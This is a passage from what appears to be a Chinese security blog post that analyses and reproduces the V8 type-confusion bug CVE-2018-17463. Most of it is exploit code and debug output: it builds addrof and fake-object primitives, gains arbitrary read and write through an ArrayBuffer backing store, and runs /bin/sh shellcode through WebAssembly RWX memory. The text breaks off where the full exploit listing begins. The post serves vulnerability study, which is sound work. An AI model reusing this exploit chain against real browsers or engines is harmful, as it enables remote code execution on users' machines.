<figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">$ ./d8 --allow-natives-syntax poc.js  </span><br><span class="line">DebugPrint: 0x1909d7a8e599: [JS_OBJECT_TYPE]  </span><br><span class="line">- map: 0x0a49d638c9d1 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]  </span><br><span class="line">- prototype: 0x1c4b472046d9 &lt;Object map = 0xa49d63822f1&gt;  </span><br><span class="line">- elements: 0x20bfb0802cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]  </span><br><span class="line">- properties: 0x20bfb0802cf1 &lt;FixedArray[0]&gt; {  </span><br><span class="line">&nbsp;&nbsp;&nbsp;<span class="hljs-comment">#x: 42 (data field 0)  </span></span><br><span class="line">&nbsp;&nbsp;&nbsp;<span class="hljs-comment">#y: 21 (data field 1)  </span></span><br><span class="line">}  </span><br><span class="line">0xa49d638c9d1: [Map]  </span><br><span class="line">- <span class="hljs-built_in">type</span>: JS_OBJECT_TYPE  </span><br><span class="line">- instance size: 40  </span><br><span class="line">- inobject properties: 2  </span><br><span class="line">- elements kind: HOLEY_ELEMENTS  </span><br><span class="line">- unused property fields: 0  </span><br><span class="line">- enum length: invalid  </span><br><span class="line">- back pointer: 0x0a49d638c981 &lt;Map(HOLEY_ELEMENTS)&gt;  </span><br><span class="line">- prototype_validity cell: 0x07f205882201 &lt;Cell value= 1&gt;  </span><br><span class="line">- instance descriptors (own) <span class="hljs-comment">#2: 0x1909d7a8e2a1 &lt;DescriptorArray[8]&gt;  </span></span><br><span class="line">- layout descriptor: (nil)  </span><br><span class="line">- prototype: 0x1c4b472046d9 &lt;Object map = 0xa49d63822f1&gt;  </span><br><span class="line">- constructor: 0x1c4b47204711 &lt;JSFunction Object (sfi = 0x7f20588f991)&gt;  </span><br><span class="line">- dependent code: 0x20bfb0802391 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;  </span><br><span class="line">- construction counter: 0  </span><br><span class="line">  </span><br><span class="line">DebugPrint: 0x1909d7a8e599: [JS_OBJECT_TYPE]  </span><br><span class="line">- map: 0x0a49d638cca1 &lt;Map(HOLEY_ELEMENTS)&gt; [DictionaryProperties]  </span><br><span class="line">- prototype: 0x1c4b472046d9 &lt;Object map = 0xa49d63822f1&gt;  </span><br><span class="line">- elements: 0x20bfb0802cf1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]  </span><br><span class="line">- properties: 0x1909d7a8e5f1 &lt;NameDictionary[29]&gt; {  </span><br><span class="line">&nbsp;&nbsp;<span class="hljs-comment">#y: 21 (data, dict_index: 2, attrs: [WEC])  </span></span><br><span class="line">&nbsp;&nbsp;<span class="hljs-comment">#x: 42 (data, dict_index: 1, attrs: [WEC])  </span></span><br><span class="line">}  </span><br><span class="line">0xa49d638cca1: [Map]  </span><br><span class="line">- <span class="hljs-built_in">type</span>: JS_OBJECT_TYPE  </span><br><span class="line">- instance size: 40  </span><br><span class="line">- inobject properties: 2  </span><br><span class="line">- elements kind: HOLEY_ELEMENTS  </span><br><span class="line">- unused property fields: 0  </span><br><span class="line">- enum length: invalid  </span><br><span class="line">- dictionary_map  </span><br><span class="line">- may_have_interesting_symbols  walkthrough://vscode_getting_started_page</span><br><span class="line">- prototype_map  </span><br><span class="line">- prototype info: 0x1c4b47223811 &lt;PrototypeInfo&gt;  </span><br><span class="line">- prototype_validity cell: 0x07f205882201 &lt;Cell value= 1&gt;  </span><br><span class="line">- instance descriptors (own) <span class="hljs-comment">#0: 0x20bfb0802321 &lt;DescriptorArray[2]&gt;  </span></span><br><span class="line">- layout descriptor: (nil)  </span><br><span class="line">- prototype: 0x1c4b472046d9 &lt;Object map = 0xa49d63822f1&gt;  </span><br><span class="line">- constructor: 0x1c4b47204711 &lt;JSFunction Object (sfi = 0x7f20588f991)&gt;  </span><br><span class="line">- dependent code: 0x20bfb0802391 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;  </span><br><span class="line">- construction counter: 0</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到，在执行之前，map的类型为<code>FastProperties</code>，但是在执行之后map的类型是<code>DictionaryProperties</code>。如果<code>f</code>经过Turbofan的优化，只保留了第一次的<code>CheckMaps</code>，则会导致后一次程序使用fast mode去寻找dictionary mode中的元素，产生错误。再次修改poc，并观察Turbofan的优化过程。</p>
<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vuln</span>(<span class="hljs-params">obj</span>) </span>{</span><br><span class="line">  obj.a;</span><br><span class="line">  <span class="hljs-built_in">Object</span>.create(obj)</span><br><span class="line">  <span class="hljs-keyword">return</span> obj.b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">vuln({<span class="hljs-attr">a</span>:<span class="hljs-number">42</span>, <span class="hljs-attr">b</span>:<span class="hljs-number">43</span>});</span><br><span class="line">vuln({<span class="hljs-attr">a</span>:<span class="hljs-number">42</span>, <span class="hljs-attr">b</span>:<span class="hljs-number">43</span>});</span><br><span class="line">%OptimizeFunctionOnNextCall(vuln);</span><br><span class="line">vuln({<span class="hljs-attr">a</span>:<span class="hljs-number">42</span>, <span class="hljs-attr">b</span>:<span class="hljs-number">43</span>});</span><br></pre></td></tr></tbody></table></figure>

<p>首先查看初始的IR图，在每一次<code>LoadField</code>之前都进行了<code>CheckMaps</code>操作。<br><img src="/2023/12/01/V8%E6%BC%8F%E6%B4%9ECVE-2018-17463%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/2.png"><br>由于<code>CreateObject</code>被定义为不写入副作用链，因此消除了冗余，<code>CheckMaps</code>节点应该不再存在。正如下图所示的simplified lowering阶段，在调用<code>JSCreateObject</code>之后的<code>CheckMaps</code>节点已被删除，直接调用<code>LoadField</code>节点。<br><img src="/2023/12/01/V8%E6%BC%8F%E6%B4%9ECVE-2018-17463%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/3.png"><br>不过在利用时，需要大量循环来调用这一函数来触发Turbofan的优化。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>现在我们有了一个可以工作的Type Confusion漏洞，该漏洞会导致V8将Dictionary当作数组访问，从而允许我们操纵对象内存布局中的函数指针和数据，但是利用的过程十分繁琐。<br>经过前面的分析，我们有办法可以让函数中多余的<code>CheckMaps</code>节点消失，并且能够通过<code>CreateObject</code>改变<code>Properties</code>，则很容易可以构造一种非预期情况。首先构造一个<code>obj</code>，初始化时赋予属性<code>a</code>，然后增加属性<code>b</code>，函数中首先访问<code>a</code>，通过类型检查，然后读取<code>x.b</code>，由于没有类型检查，此时返回一个与原<code>b</code>属性偏移相同的数据，但由于<code>Properties</code>发生变化，返回的数据不会再是<code>b</code>属性的值。<br>想要稳定利用这一漏洞，一个很大的问题在于，Dictionary内部的内存布局是随机的，不过在V8中有一规律，相同属性的<code>obj</code>，在<code>Dictionary</code>中各属性的偏移也相同。根据这一规律，我们可以使用同样的构造方式来构造具有相同属性的不同<code>obj</code>，来满足不同的需求。</p>
<h3 id="Property-Overlapping"><a href="#Property-Overlapping" class="headerlink" title="Property Overlapping"></a>Property Overlapping</h3><p>根据上面的分析，利用这一漏洞时，访问属性<code>b</code>时会访问到一个其他的元素。我们可以利用这种property overlapping，实现类型混淆。如属性<code>b</code>是一个<code>Number</code>类型，而另一个属性是一个<code>Object</code>类型，访问属性<code>b</code>会以<code>Number</code>的方式读出<code>Object</code>的地址，造成地址泄露。如果想要控制泄露的<code>Object</code>，就需要知道另一个属性是什么。<br>下面是一种比较简单常用的方法，按照一定的规律进行赋值，如属性<code>bi</code>的值定义为<code>-i</code>，然后依次读取，如果读出的值与原值不同，则可以根据读出的值找到最终读出的是哪一个属性的值。</p>
<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getObj</span>(<span class="hljs-params">values</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">let</span> obj = { <span class="hljs-attr">a</span>: <span class="hljs-number">1234</span> };</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {</span><br><span class="line">    <span class="hljs-built_in">Object</span>.defineProperty(obj, <span class="hljs-string">'b'</span> + i, {</span><br><span class="line">      <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,</span><br><span class="line">      <span class="hljs-attr">value</span>: values[i]</span><br><span class="line">    });</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> obj;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> p1, p2;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">findOverlapping</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">let</span> names = [];</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) {</span><br><span class="line">    names[i] = <span class="hljs-string">'b'</span> + i;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span></span><br><span class="line"><span class="hljs-string">    function vuln(obj) {</span></span><br><span class="line"><span class="hljs-string">      obj.a;</span></span><br><span class="line"><span class="hljs-string">      this.Object.create(obj);</span></span><br><span class="line"><span class="hljs-string">      <span class="hljs-subst">${names.map((b) =&gt; <span class="hljs-string">`let <span class="hljs-subst">${b}</span> = obj.<span class="hljs-subst">${b}</span>;`</span>).join(<span class="hljs-string">'\n'</span>)}</span></span></span><br><span class="line"><span class="hljs-string">      return [<span class="hljs-subst">${names.join(<span class="hljs-string">', '</span>)}</span>];</span></span><br><span class="line"><span class="hljs-string">    }</span></span><br><span class="line"><span class="hljs-string">  `</span>)</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> values = [];</span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">32</span>; i++) {</span><br><span class="line">    values[i] = -i;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {</span><br><span class="line">    <span class="hljs-keyword">let</span> res = vuln(getObj(values));</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; res.length; i++) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (i !== -res[i] &amp;&amp; res[i] &lt; <span class="hljs-number">0</span> &amp;&amp; res[i] &gt; -<span class="hljs-number">32</span>) {</span><br><span class="line">        [p1, p2] = [i, -res[i]];</span><br><span class="line">        <span class="hljs-keyword">return</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">throw</span> <span class="hljs-string">"[!] Failed to find overlapping"</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">"step 1: check whether vulnerability exists"</span>);</span><br><span class="line">check_vul();</span><br><span class="line">print(<span class="hljs-string">"[+] Finding Overlapping Properties..."</span>);</span><br><span class="line">findOverlapping();</span><br><span class="line">print(<span class="hljs-string">`[+] Properties b<span class="hljs-subst">${p1}</span> and p<span class="hljs-subst">${p2}</span> overlap!`</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>很容易可以找到我们需要的两个属性。</p>
<figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] Finding Overlapping Properties...  </span><br><span class="line">[+] Properties b12 and b21 overlap!</span><br></pre></td></tr></tbody></table></figure>

<h3 id="Addr-Of"><a href="#Addr-Of" class="headerlink" title="Addr Of"></a>Addr Of</h3><p><code>Addrof</code>是一个在V8利用中很常见的原语，用来泄露一个<code>obj</code>的地址。当我们有类型混淆漏洞时，这个原语的实现就十分简单，在前面也介绍过。我们将上一步中得到的第一个属性记为<code>p1</code>，第二个属性记为<code>p2</code>，由于对<code>p1</code>的访问实际上是对<code>p2</code>内容的访问，设置属性<code>p1</code>为<code>Number</code>，属性<code>p2</code>为想要泄露地址的<code>Object obj</code>，通过读取<code>p1</code>就可以读取出<code>obj</code>的地址。</p>
<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addrof</span>(<span class="hljs-params">obj</span>) </span>{</span><br><span class="line">  <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span></span><br><span class="line"><span class="hljs-string">  function vuln(obj) {</span></span><br><span class="line"><span class="hljs-string">    obj.a;</span></span><br><span class="line"><span class="hljs-string">    this.Object.create(obj);</span></span><br><span class="line"><span class="hljs-string">    return obj.b<span class="hljs-subst">${p1}</span>.x1;</span></span><br><span class="line"><span class="hljs-string">  }</span></span><br><span class="line"><span class="hljs-string">`</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> values = [];</span><br><span class="line">  values[p1] = { <span class="hljs-attr">x1</span>: <span class="hljs-number">1.1</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">1.2</span> };</span><br><span class="line">  values[p2] = { <span class="hljs-attr">y</span>: obj };</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {</span><br><span class="line">    <span class="hljs-keyword">let</span> res = vuln(getObj(values));</span><br><span class="line">    <span class="hljs-keyword">if</span> (res != <span class="hljs-number">1.1</span>) {</span><br><span class="line">      print(<span class="hljs-string">`[+] Object Address: <span class="hljs-subst">${Int64.fromDouble(res).toString()}</span>`</span>);</span><br><span class="line">      <span class="hljs-keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">throw</span> <span class="hljs-string">"[!] AddrOf Primitive Failed"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>上面的代码中，<code>vuln</code>函数访问了<code>p1</code>的<code>x1</code>，在产生优化之后，会访问到<code>p2</code>的<code>y</code>也就是<code>obj</code>，从而以浮点数返回<code>obj</code>的地址。</p>
<h3 id="Arbitrary-Write"><a href="#Arbitrary-Write" class="headerlink" title="Arbitrary Write"></a>Arbitrary Write</h3><p>同样，我们可以构造一个<code>Object</code>，如下面的<code>o</code>，其中的各个属性均为<code>Number</code>。</p>
<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> o = { <span class="hljs-attr">x1</span>: <span class="hljs-number">1.1</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">1.2</span> };</span><br><span class="line">values[p1] = o;</span><br><span class="line">values[p2] = obj;</span><br></pre></td></tr></tbody></table></figure>

<p>我们对<code>p1</code>中的<code>x1</code>和<code>x2</code>进行写入时，实际上会写入<code>obj</code>中的对应位置。这里有一个非常常用的结构<code>ArrayBuffer</code>，其中的<code>backing_store</code>字段存放了一个内存地址，该地址是实际读写时的地址。如果能够修改该地址为任意地址，则可以利用这一<code>ArrayBuffer</code>达到任意地址读写的效果。<br>通过调试很容易发现，<code>backing_store</code>和<code>x2</code>的偏移相同，因此对<code>x2</code>进行修改能够达到修改<code>backing_store</code>的作用，进而可以控制<code>ArrayBuffer</code>任意地址读写。</p>
<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fakeObj</span>(<span class="hljs-params">obj, addr</span>) </span>{</span><br><span class="line">  <span class="hljs-built_in">eval</span>(<span class="hljs-string">`</span></span><br><span class="line"><span class="hljs-string">  function vuln(obj) {</span></span><br><span class="line"><span class="hljs-string">    obj.a;</span></span><br><span class="line"><span class="hljs-string">    this.Object.create(obj);</span></span><br><span class="line"><span class="hljs-string">    let orig = obj.b<span class="hljs-subst">${p1}</span>.x2;</span></span><br><span class="line"><span class="hljs-string">    obj.b<span class="hljs-subst">${p1}</span>.x2 = <span class="hljs-subst">${addr}</span>;</span></span><br><span class="line"><span class="hljs-string">    return orig;</span></span><br><span class="line"><span class="hljs-string">  }</span></span><br><span class="line"><span class="hljs-string">`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> values = [];</span><br><span class="line">  <span class="hljs-keyword">let</span> o = { <span class="hljs-attr">x1</span>: <span class="hljs-number">1.1</span>, <span class="hljs-attr">x2</span>: <span class="hljs-number">1.2</span> };</span><br><span class="line">  values[p1] = o;</span><br><span class="line">  values[p2] = obj;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {</span><br><span class="line">    o.x2 = <span class="hljs-number">1.2</span>;</span><br><span class="line">    <span class="hljs-keyword">let</span> res = vuln(getObj(values));</span><br><span class="line">    <span class="hljs-keyword">if</span> (res != <span class="hljs-number">1.2</span>) {</span><br><span class="line">      <span class="hljs-keyword">return</span> res;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">throw</span> <span class="hljs-string">"[!] fakeObj Primitive Failed"</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h3 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h3><p>Get shell的方法比较常规，通过<code>wasm</code>分配一块可读写可执行的内存，然后通过间接寻址找到这一内存，在这一版本中<code>wasmInstance</code>偏移<code>0xf0</code>处即为该地址。通过任意地址读写讲shellcode写入，通过调用wasm中的函数执行写入的shellcode。</p>
<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">109</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">133</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">96</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">127</span>, <span class="hljs-number">3</span>, <span class="hljs-number">130</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">112</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">131</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">129</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">145</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>, <span class="hljs-number">109</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">121</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">109</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">138</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">132</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">42</span>, <span class="hljs-number">11</span>]);</span><br><span class="line"><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> WebAssembly.Instance(wasmModule, {});</span><br><span class="line"><span class="hljs-keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="hljs-keyword">let</span> mem = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">1024</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> dv = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(mem);</span><br><span class="line"><span class="hljs-keyword">let</span> addr = addrof(wasmInstance);</span><br><span class="line">fakeObj(mem, addr);</span><br><span class="line"><span class="hljs-keyword">let</span> code_addr = Int64.fromDouble(dv.getFloat64(<span class="hljs-number">0xf0</span> - <span class="hljs-number">1</span>, <span class="hljs-literal">true</span>));</span><br><span class="line">print(<span class="hljs-string">"rwx addr"</span>, code_addr);</span><br><span class="line">fakeObj(mem, code_addr.asDouble());</span><br><span class="line"><span class="hljs-keyword">let</span> shellcode = [</span><br><span class="line">  <span class="hljs-number">0x2fbb485299583b6an</span>,</span><br><span class="line">  <span class="hljs-number">0x5368732f6e69622fn</span>,</span><br><span class="line">  <span class="hljs-number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"><span class="hljs-keyword">let</span> data_view = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(mem);</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++)</span><br><span class="line">  data_view.setBigUint64(<span class="hljs-number">8</span> * i, shellcode[i], <span class="hljs-literal">true</span>);</span><br><span class="line">f();</span><br></pre></td></tr></tbody></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>完整的exp如下，前面的板子来自<a target="_blank" rel="noopener" href="http://p4nda.top/2019/06/11/%C2%96CVE-2018-17463/">这里</a>。</p>
<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span 